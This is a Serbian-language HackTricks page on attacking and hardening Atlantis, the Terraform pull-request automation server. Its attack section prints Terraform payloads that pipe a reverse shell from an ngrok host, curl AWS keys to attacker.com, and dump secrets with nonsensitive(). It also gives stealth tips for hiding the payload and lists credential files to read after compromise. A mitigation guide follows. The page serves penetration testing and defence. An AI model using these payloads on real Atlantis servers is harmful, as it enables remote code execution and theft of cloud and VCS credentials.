# Bezbednost Atlantisa

<details>

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne informacije

Atlantis vam u osnovi pomaže da pokrenete terraform iz Pull zahteva sa vašeg git servera.

![](<../.gitbook/assets/image (161).png>)

## Lokalni Lab

1. Idite na **stranicu izdanja Atlantisa** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **preuzmite** onaj koji vam odgovara.
2. Kreirajte **lični token** (sa pristupom repozitorijumu) vašeg **github** korisnika
3. Izvršite `./atlantis testdrive` i on će kreirati **demo repozitorijum** koji možete koristiti da **komunicirate sa atlantisom**
1. Možete pristupiti web stranici na 127.0.0.1:4141

## Pristup Atlantisu

### Krediti Git Servera

**Atlantis** podržava nekoliko git domaćina kao što su **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Međutim, da bi pristupao repozitorijumima na tim platformama i obavljao akcije, potrebno je da imaju neki **dodeljen privilegovan pristup** (barem dozvole za pisanje).\
[Dokumentacija](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) podstiče da kreirate korisnika na ovim platformama specifično za Atlantisa, ali neki ljudi mogu koristiti lične naloge.

{% hint style="warning" %}
U svakom slučaju, sa perspektive napadača, **Atlantis nalog** će biti veoma **interesantan za kompromitovanje**.
{% endhint %}

### Webhookovi

Atlantis opciono koristi [**Webhook tajne**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) da validira da li su **webhookovi** koje prima od vašeg Git domaćina **legitimni**.

Jedan način da se to potvrdi je da se **dozvole zahteve samo da dolaze sa IP adresa** vašeg Git domaćina, ali jednostavniji način je korišćenje Webhook Tajne.

Imajte na umu da osim ako koristite privatni github ili bitbucket server, moraćete da izložite krajnje tačke webhooka internetu.

{% hint style="warning" %}
Atlantis će **izlagati webhookove** tako da git server može slati informacije. Sa perspektive napadača bilo bi interesantno znati **da li možete slati poruke**.
{% endhint %}

### Krediti Provajdera <a href="#provider-credentials" id="provider-credentials"></a>

[Od dokumentacije:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis pokreće Terraform jednostavno **izvršavanjem `terraform plan` i `apply`** komandi na serveru **na kome je hostovan Atlantis**. Baš kao kada pokrećete Terraform lokalno, Atlantisu su potrebni krediti za vaš specifičan provajder.

Na vama je kako ćete [dostaviti kredite](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) za vaš specifičan provajder Atlantisu:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i [AWS Fargate Modul](https://www.runatlantis.io/docs/deployment.html#aws-fargate) imaju svoje mehanizme za kredite provajdera. Pročitajte njihovu dokumentaciju.
* Ako pokrećete Atlantisa u oblaku, mnogi oblaci imaju načine da daju pristup cloud API-ju aplikacijama koje se izvršavaju na njima, npr:
* [AWS EC2 Uloge](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Pretražite "EC2 Uloga")
* [GCE Instance Servisni Nalozi](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Mnogi korisnici postavljaju okružne promenljive, npr. `AWS_ACCESS_KEY`, gde se Atlants izvršava.
* Drugi kreiraju neophodne konfiguracione fajlove, npr. `~/.aws/credentials`, gde se Atlants izvršava.
* Koristite [HashiCorp Vault Provajder](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) da dobijete kredite provajdera.

{% hint style="warning" %}
**Kontejner** u kome **Atlantis** **radi** će verovatno **sadržati privilegovane kredite** za provajdere (AWS, GCP, Github...) koje Atlantis upravlja putem Terraforma.
{% endhint %}

### Web Stranica

Podrazumevano, Atlantis će pokrenuti **web stranicu na portu 4141 na localhostu**. Ova stranica vam omogućava da omogućite/onemogućite atlantis apply i proverite status plana repozitorijuma i otključate ih (ne dozvoljava modifikacije, pa nije toliko korisna).

Verovatno je nećete naći izloženu internetu, ali izgleda da podrazumevano **nije potrebno korisničko ime i lozinka** za pristup (a ako jesu, `atlantis`:`atlantis` su **podrazumevani**).

## Konfiguracija Servera

Konfiguracija za `atlantis server` može se specificirati putem zastavica komandne linije, okružnih promenljivih, konfiguracionog fajla ili kombinacijom ova tri.

* Možete pronaći [**ovde listu zastavica**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) podržanih od strane Atlantisa servera
* Možete pronaći [**ovde kako transformisati opciju konfiguracije u okružnu promenljivu**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Vrednosti se **biraju po ovom redosledu**:

1. Zastavice
2. Okružne Promenljive
3. Konfiguracioni Fajl

{% hint style="warning" %}
Imajte na umu da u konfiguraciji možete pronaći interesantne vrednosti kao što su **tokeni i lozinke**.
{% endhint %}

### Konfiguracija Repozitorijuma

Neke konfiguracije utiču na **način upravljanja repozitorijumima**. Međutim, moguće je da **svaki repozitorijum zahteva različite postavke**, pa postoje načini da se specificira svaki repozitorijum. Ovo je prioritetni redosled:

1. Repozitorijum [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) fajl. Ovaj fajl se može koristiti da se specificira kako atlantis treba da tretira repozitorijum. Međutim, podrazumevano neke ključne vrednosti ne mogu biti specificirane ovde bez određenih zastavica koje to omogućavaju.
1. Verovatno je potrebno dozvoliti ih zastavicama poput `allowed_overrides` ili `allow_custom_workflows`
2. [**Konfiguracija na Serveru**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Možete je proslediti zastavicom `--repo-config` i to je yaml koji konfiguriše nove postavke za svaki repozitorijum (podržani su regexi)
3. **Podrazumevane** vrednosti
#### Zaštita PR-a

Atlantis omogućava da naznačite da li želite da **PR** odobri neko drugi (čak i ako to nije postavljeno u zaštiti grane) i/ili da bude **`spojiv`** (zaštita grane je prošla) **pre pokretanja primene**. Sa aspekta bezbednosti, preporučljivo je postaviti oba opcije.

U slučaju da je `allowed_overrides` True, ova podešavanja mogu biti **prepisana na svakom projektu putem fajla `/atlantis.yml`**.

#### Skripte

Konfiguracija repozitorijuma može **specificirati skripte** koje će se izvršiti [**pre**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**posle**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) izvršenja **workflow-a**.

Ne postoji opcija da se **specificiraju** ove skripte u **repozitorijumskom fajlu `/atlantis.yml`**.

#### Workflow

U konfiguraciji repozitorijuma (konfiguracija na serverskoj strani) možete [**specificirati novi podrazumevani workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ili [**kreirati nove prilagođene workflow-e**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Takođe možete **specificirati** koje **repozitorijume** mogu **pristupiti** novim generisanim.

Zatim, možete dozvoliti fajlu **atlantis.yaml** svakog repozitorijuma da **specificira workflow koji će se koristiti**.

{% hint style="danger" %}
Ako je zastava [**konfiguracije na serverskoj strani**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` postavljena na **True**, workflow-i mogu biti **specificirani** u **`atlantis.yaml`** fajlu svakog repozitorijuma. Potencijalno je takođe potrebno da **`allowed_overrides`** takođe specificira **`workflow`** da bi **prepisao workflow** koji će biti korišćen.\
Ovo će u osnovi omogućiti **RCE na Atlantis serveru svakom korisniku koji može pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Provera politike Conftest

Atlantis podržava pokretanje **server-side** [**conftest**](https://www.conftest.dev/) **polisa** protiv izlaza plana. Uobičajene upotrebe za korišćenje ovog koraka uključuju:

* Odbijanje korišćenja liste modula
* Tvrdnja atributa resursa prilikom kreiranja
* Otkrivanje nenamernih brisanja resursa
* Prevencija sigurnosnih rizika (tj. izlaganje sigurnih portova javnosti)

Možete proveriti kako da ga konfigurišete u [**dokumentaciji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Atlantis Komande

[U dokumentaciji](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) možete pronaći opcije koje možete koristiti za pokretanje Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Napadi

{% hint style="warning" %}
Ako tokom eksploatacije naiđete na ovu **grešku**: `Error: Error acquiring the state lock`

Možete je popraviti pokretanjem:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Izmena konfiguracije u novom PR-u

Ako imate pristup za pisanje nad repozitorijumom, bićete u mogućnosti da napravite novu granu na njemu i generišete PR. Ako možete **izvršiti `atlantis plan`** (ili možda se automatski izvršava) **bićete u mogućnosti da izvršite udaljeni kod unutar Atlantis servera**.

To možete uraditi tako što ćete [**naterati Atlantisa da učita spoljni izvor podataka**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Samo ubacite payload poput sledećeg u fajl `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Skriveniji napad

Ovaj napad možete izvesti čak i na **skriveniji način**, prateći ove sugestije:

* Umesto dodavanja reverznog šella direktno u terraform fajl, možete **učitati spoljni resurs** koji sadrži reverzni šel:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Možete pronaći rev shell kod na [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* U spoljnom resursu, koristite **ref** funkciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, nešto poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Umesto** kreiranja **PR-a ka masteru** da biste pokrenuli Atlantis, **napravite 2 grane** (test1 i test2) i napravite **PR sa jedne na drugu**. Kada završite napad, jednostavno **uklonite PR i grane**.

### Atlantis plan Dump Tajni

Možete **izvući tajne korišćene od strane terraforma** pokretanjem `atlantis plan` (`terraform plan`) ubacivanjem nečega poput ovoga u terraform fajl:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis primenjuje RCE - Izmena konfiguracije u novom PR-u

Ako imate pristup za pisanje nad repozitorijumom, moći ćete da napravite novu granu na njemu i generišete PR. Ako možete **izvršiti `atlantis apply` moći ćete da izvršite RCE unutar Atlantisa servera**.

Međutim, obično ćete morati da zaobiđete neka zaštitna podešavanja:

* **Spojivo**: Ako je ova zaštita postavljena u Atlantisu, možete pokrenuti **`atlantis apply` samo ako je PR spojiv** (što znači da zaštita grane mora biti zaobiđena).
* Proverite potencijalne [**zaobilaske zaštite grane**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
* **Odobreno**: Ako je ova zaštita postavljena u Atlantisu, **neki drugi korisnik mora odobriti PR** pre nego što možete pokrenuti `atlantis apply`
* Podrazumevano možete zloupotrebiti [**Gitbot token da biste zaobišli ovu zaštitu**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Pokretanje **`terraform apply` na zlonamerni Terraform fajl sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo se pobrinite da neki payload poput sledećih završi u fajlu `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pratite **preporuke iz prethodne tehnike** kako biste izvršili ovaj napad na **diskretniji način**.

### Umetanje Terraform parametara

Prilikom pokretanja `atlantis plan` ili `atlantis apply`, terraform se pokreće ispod, možete proslediti komande terraformu iz atlantisa komentarišući nešto poput:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Nešto što možete proslediti su env promenljive koje mogu biti korisne za zaobilaženje nekih zaštita. Proverite terraform env vars na [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Prilagođeni Radni Tok

Pokretanje **zlonamernih prilagođenih naredbi za izgradnju** navedenih u datoteci `atlantis.yaml`. Atlantis koristi datoteku `atlantis.yaml` sa grane zahteva za povlačenje, **ne** sa `master` grane.\
Ova mogućnost je pomenuta u prethodnom odeljku:

{% hint style="danger" %}
Ako je zastava [**konfiguracija na serverskoj strani**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) postavljena na **True**, radni tokovi mogu biti **navedeni** u datoteci **`atlantis.yaml`** svakog repozitorijuma. Potencijalno je takođe potrebno da **`allowed_overrides`** takođe specificira i **`workflow`** da bi se **zamenio radni tok** koji će biti korišćen.

Ovo će u osnovi omogućiti **RCE na Atlantis serveru bilo kom korisniku koji može pristupiti tom repozitorijumu**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Zaobilaženje zaštite planiranja/primene

Ako je zastava [**konfiguracija sa serverske strane**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _konfigurisana_ sa `apply_requirements`, moguće je da repozitorijum **izmeni zaštitu planiranja/primene kako bi je zaobišao**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Preuzimanje identiteta

Ako neko pošalje **`atlantis plan/apply` komentare na vaše validne zahteve za povlačenje,** to će uzrokovati da se terraform pokrene kada to ne želite.

Osim toga, ako nemate konfigurisano u **zaštiti grane** da zatražite **ponovno procenjivanje** svakog zahteva za povlačenje kada se **doda novi commit** na nju, neko bi mogao **napisati zlonamerne konfiguracije** (proverite prethodne scenarije) u terraform konfiguraciji, pokrenuti `atlantis plan/apply` i dobiti RCE.

Ovo je **postavka** u Github zaštiti grane:

![](<../.gitbook/assets/image (216).png>)

### Tajna Webhook-a

Ako uspete da **ukradete tajnu webhook-a** koja se koristi ili ako se **ne koristi nikakva tajna webhook-a**, mogli biste **pozvati Atlantis webhook** i **izvršiti atlantis komande** direktno.

### Bitbucket

Bitbucket Cloud **ne podržava tajne webhook-a**. To bi moglo omogućiti napadačima da **falsifikuju zahteve sa Bitbucket-a**. Proverite da li dozvoljavate samo IP adrese Bitbucket-a.

* To znači da bi **napadač** mogao poslati **lažne zahteve Atlantisu** koji izgledaju kao da dolaze sa Bitbucket-a.
* Ako specificirate `--repo-allowlist` onda bi mogli samo da lažiraju zahteve koji se odnose na te repozitorijume, tako da bi najveća šteta koju bi mogli da naprave bila da planiraju/primene na vašim sopstvenim repozitorijumima.
* Da biste to sprečili, dozvolite [IP adrese Bitbucket-a](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (vidi Izlazne IPv4 adrese).

## Post-Eksploatacija

Ako ste uspeli da pristupite serveru ili ste barem dobili LFI, postoje neke zanimljive stvari koje biste trebali pokušati pročitati:

* `/home/atlantis/.git-credentials` Sadrži pristupne podatke za vcs
* `/atlantis-data/atlantis.db` Sadrži pristupne podatke za vcs sa više informacija
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform stanje datoteke
* Primer: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Env promenljive
* `/proc/[2-20]/cmdline` Komandna linija `atlantis server` (može sadržati osetljive podatke)

## Otklanjanje

### Ne Koristite Na Javnim Repozitorijumima <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Zato što bilo ko može komentarisati javne zahteve za povlačenje, čak i sa svim dostupnim sigurnosnim merama, i dalje je opasno pokretati Atlantis na javnim repozitorijumima bez odgovarajuće konfiguracije sigurnosnih postavki.

### Ne Koristite `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Ako radite na javnom repozitorijumu (što se ne preporučuje, vidi gore) ne biste trebali postaviti `--allow-fork-prs` (podrazumevano je false) jer bilo ko može otvoriti zahtev za povlačenje sa svog forka ka vašem repozitorijumu.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis zahteva da specificirate listu dozvoljenih repozitorijuma sa kojih će prihvatati webhook-ove putem `--repo-allowlist` zastave. Na primer:

* Specifični repozitorijumi: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Ceo vaša organizacija: `--repo-allowlist=github.com/runatlantis/*`
* Svi repozitorijumi u vašoj GitHub Enterprise instalaciji: `--repo-allowlist=github.yourcompany.com/*`
* Svi repozitorijumi: `--repo-allowlist=*`. Korisno kada ste u zaštićenoj mreži, ali opasno bez postavljanja tajne webhook-a.

Ova zastava osigurava da vaša instalacija Atlantisa nije korišćena sa repozitorijumima koje ne kontrolišete. Pogledajte `atlantis server --help` za više detalja.

### Zaštita Terraform Planiranja <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Ako su napadi koji podnose zahteve za povlačenje sa zlonamernim Terraform kodom u vašem modelu pretnje, morate biti svesni da odobrenja za `terraform apply` nisu dovoljna. Moguće je pokrenuti zlonamerni kod u `terraform plan` koristeći [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ili specificiranjem zlonamernog provajdera. Taj kod bi mogao da ekstraktuje vaše akreditive.

Da biste to sprečili, možete:

1. Ugraditi provajdere u sliku Atlantisa ili host i zabraniti izlaz u produkciji.
2. Implementirati protokol registra provajdera interno i zabraniti javni izlaz, na taj način kontrolišete ko ima pristup za pisanje u registar.
3. Modifikujte [konfiguraciju repozitorijuma na serverskoj strani](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` korak da validira protiv korišćenja zabranjenih provajdera ili data izvora ili PR-ova od korisnika koji nisu dozvoljeni. Takođe možete dodati dodatnu validaciju u ovom trenutku, npr. zahtevajući "thumbs-up" na PR pre nego što dozvolite nastavak `plan`-a. Conftest bi mogao biti od koristi ovde.

### Tajne Webhook-a <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis bi trebalo pokrenuti sa postavljenim tajnama webhook-a putem `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` okruženjskih promenljivih. Čak i sa postavljenom `--repo-allowlist` zastavom, bez tajne webhook-a, napadači bi mogli poslati zahteve Atlantisu predstavljajući se kao repozitorijum koji je na listi dozvoljenih. Tajne webhook-a osiguravaju da zahtevi webhook-a zaista dolaze od vašeg VCS provajdera (GitHub ili GitLab).

Ako koristite Azure DevOps, umesto tajni webhook-a dodajte osnovno korisničko ime i lozinku.

### Osnovna Autentikacija Azure DevOps-a <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps podržava slanje osnovnog autentikacionog zaglavlja u svim webhook događajima. Ovo zahteva korišćenje HTTPS URL-a za lokaciju vašeg webhook-a.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Ako koristite tajne webhook-a, ali je vaš saobraćaj preko HTTP-a, tajne webhook-a mogu biti ukradene. Omogućite SSL/HTTPS korišćenjem `--ssl-cert-file` i `--ssl-key-file` zastava.

### Omogućite Autentikaciju na Atlantis Web Serveru <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Veoma je preporučljivo omogućiti autentikaciju na web servisu. Omogućite BasicAuth korišćenjem `--web-basic-auth=true` i postavite korisničko ime i lozinku korišćenjem `--web-username=yourUsername` i `--web-password=yourPassword` zastava.

Takođe možete proslediti ove vrednosti kao okruženjske promenljive `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` i `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Reference

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
